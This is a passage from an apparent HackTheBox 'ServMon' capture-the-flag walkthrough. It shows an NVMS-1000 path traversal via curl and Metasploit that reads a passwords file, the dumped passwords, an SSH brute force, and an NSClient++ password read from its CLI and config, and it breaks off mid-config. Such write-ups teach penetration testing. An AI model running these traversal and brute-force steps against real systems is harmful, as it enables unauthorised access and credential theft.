class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RHOSTS =&gt; 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/smb/smb_enumshares) &gt; run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] 10.10.10.184:139      - Login Failed: Unable to Negotiate with remote host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.10.184:         - Scanned 1 of 1 hosts (100% complete)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Auxiliary module execution completed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>MSF can&#x27;t list shares either. Let&#x27;s verify it is supporting SMBv2:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/smb/smb2) &gt; set RHOSTS 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RHOSTS =&gt; 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/smb/smb2) &gt; run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.10.184:445      - 10.10.10.184 supports SMB 2 [dialect 255.2] and has been online for 3676767 hours</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.10.184:445      - Scanned 1 of 1 hosts (100% complete)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Auxiliary module execution completed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-reconnaissance-ftp-lets-go-back">Network reconnaissance: FTP (let&#x27;s go back)<a href="#network-reconnaissance-ftp-lets-go-back" class="hash-link" aria-label="Direct link to Network reconnaissance: FTP (let&#x27;s go back)" title="Direct link to Network reconnaissance: FTP (let&#x27;s go back)">â€‹</a></h3><p>As we saw earlier with <code>ftp</code> CLI we didn&#x27;t see anything.
But I tried again with FileZilla and saw two folders this time, with a file in
each:</p><ul><li><code>Nadine/Confidential.txt</code></li><li><code>Nathan/Notes to do.txt</code></li></ul><p><code>Confidential.txt</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nathan,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Regards</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nadine</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>Notes to do.txt</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">1) Change the password for NVMS - Complete</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2) Lock down the NSClient Access - Complete</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3) Upload the passwords</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4) Remove public access to NVMS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5) Place the secret files in SharePoint</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-reconnaissance-http-lets-go-back">Network reconnaissance: HTTP (let&#x27;s go back)<a href="#network-reconnaissance-http-lets-go-back" class="hash-link" aria-label="Direct link to Network reconnaissance: HTTP (let&#x27;s go back)" title="Direct link to Network reconnaissance: HTTP (let&#x27;s go back)">â€‹</a></h3><p>Let&#x27;s use <code>NVMS-1000</code> path traversal again but this time with:
<code>Users/Nathan/Desktop/Passwords.txt</code> thanks to the information we got on the FTP.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ Users/Nathan/Desktop/Passwords.txt passwords.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dos2unix: active code page: 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host not vulnerable to Directory Traversal!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>No file but we are sure it&#x27;s here. This exploit looks bad so it may be broken.</p><p>With curl no result either:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ curl &#x27;http://10.10.10.184/../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt&#x27; --head</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP/1.1 404 Not Found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-type: text/html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Content-Length: 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection: close</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">AuthInfo:</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But with <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">metasploit</a> we get the file (WTF):</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 &gt; search NVMS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Modules</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   #  Name                                       Disclosure Date  Rank    Check  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   -  ----                                       ---------------  ----    -----  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 &gt; use 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/http/tvt_nvms_traversal) &gt; options</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module options (auxiliary/scanner/http/tvt_nvms_traversal):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name       Current Setting   Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----       ---------------   --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   DEPTH      13                yes       Depth for Path Traversal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   FILEPATH   /windows/win.ini  yes       The path to the file to read</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   RPORT      80                yes       The target port (TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   SSL        false             no        Negotiate SSL/TLS for outgoing connections</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   TARGETURI  /                 yes       The base URI path of nvms</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   THREADS    1                 yes       The number of concurrent threads (max one per host)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   VHOST                        no        HTTP server virtual host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/http/tvt_nvms_traversal) &gt; set RHOSTS 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RHOSTS =&gt; 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/http/tvt_nvms_traversal) &gt; set FILEPATH /Users/Nathan/Desktop/Passwords.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">FILEPATH =&gt; /Users/Nathan/Desktop/Passwords.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/http/tvt_nvms_traversal) &gt; run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.10.184:80 - Downloaded 156 bytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] File saved in: /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Scanned 1 of 1 hosts (100% complete)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Auxiliary module execution completed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/http/tvt_nvms_traversal)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1nsp3ctTh3Way2Mars!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Th3r34r3To0M4nyTrait0r5!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">B3WithM30r4ga1n5tMe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">L1k3B1gBut7s@W0rk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0nly7h3y0unGWi11F0l10w</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">IfH3s4b0Utg0t0H1sH0me</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Gr4etN3w5w17hMySk1Pa5$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-exploitation-ssh">Network exploitation: SSH<a href="#network-exploitation-ssh" class="hash-link" aria-label="Direct link to Network exploitation: SSH" title="Direct link to Network exploitation: SSH">â€‹</a></h3><p>With the looted passwords let&#x27;s bruteforce SSH for the users nadine and nathan
by using a <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">metasploit</a> module.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RHOSTS =&gt; 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PASS_FILE =&gt; /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USER_FILE /home/cyfun/CTF/HackTheBox/machines/ServMon/usernames.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">USER_FILE =&gt; /home/cyfun/CTF/HackTheBox/machines/ServMon/usernames.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.10.184:22 - Success: &#x27;nadine:L1k3B1gBut7s@W0rk&#x27; &#x27;&#x27;id&#x27; is not recognized as an internal or external command,  operable program or batch file.  &#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command shell session 1 opened (10.10.15.26:45331 -&gt; 10.10.10.184:22) at 2020-06-11 18:10:19 +0200</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] 10.10.10.184:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with &#x27;set gatherproof off&#x27;.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Scanned 1 of 1 hosts (100% complete)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Auxiliary module execution completed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So a valid set of credentials was <code>nadine:L1k3B1gBut7s@W0rk</code>.</p><p><a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">metasploit</a> automatically opened us a session but with <code>cmd.exe</code>. But I prefer
to have a powershell shell.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ssh nadine@10.10.10.184 powershell.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nadine@10.10.10.184&#x27;s password: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Windows PowerShell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copyright (C) Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Try the new cross-platform PowerShell https://aka.ms/pscore6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\Nadine&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s get our user flag:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\Nadine&gt; gc Desktop\user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">f9dc9b5ab530d6d295219c156662c3c9</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem">Privilege Escalation  through NSClient++: Nadine to NT Authority\SYSTEM<a href="#privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem" class="hash-link" aria-label="Direct link to Privilege Escalation  through NSClient++: Nadine to NT Authority\SYSTEM" title="Direct link to Privilege Escalation  through NSClient++: Nadine to NT Authority\SYSTEM">â€‹</a></h3><p>Remember of the hypothesis I made about <code>NSClient++</code>. Let&#x27;s read EDB-ID 46802
again.</p><p>We can use the CLI tool to display the password:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\Nadine&gt; cd &quot;C:\Program Files\NSClient++&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Program Files\NSClient++&gt; .\nscp web -- password --display</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Current password: ew2x6SsGTxjRwXOT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>By trying to login with the password at <a href="https://10.10.10.184:8443/index.html" target="_blank" rel="noopener noreferrer">https://10.10.10.184:8443/index.html</a>
we are denied.</p><p><img loading="lazy" src="https://i.imgur.com/xOahmka.png" class="img_ev3q"></p><p>But if we read the config file <code>gc &quot;c:\program files\nsclient++\nsclient.ini&quot;</code>
we can see something.</p><div class="language-ini codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ini codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># If you want to fill this file with all available options run the following command:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#   nscp settings --generate --add-defaults --load-all</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># If you want to activate a module and bring in all its options use:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># For details run: nscp settings --help</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; in flight - TODO</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[/settings/default]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">password = ew2x6SsGTxjRwXOT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">allowed hosts = 127.0.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; in flight - TODO</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[/settings/NRPE/server]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssl options = no-sslv2,no-sslv3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">verify mode = peer-cert</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">insecure = false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; in flight - TODO</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[/modules]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">CheckHelpers = disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">CheckEventLog = disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">CheckNSCP = disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">; Undocumented key</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token 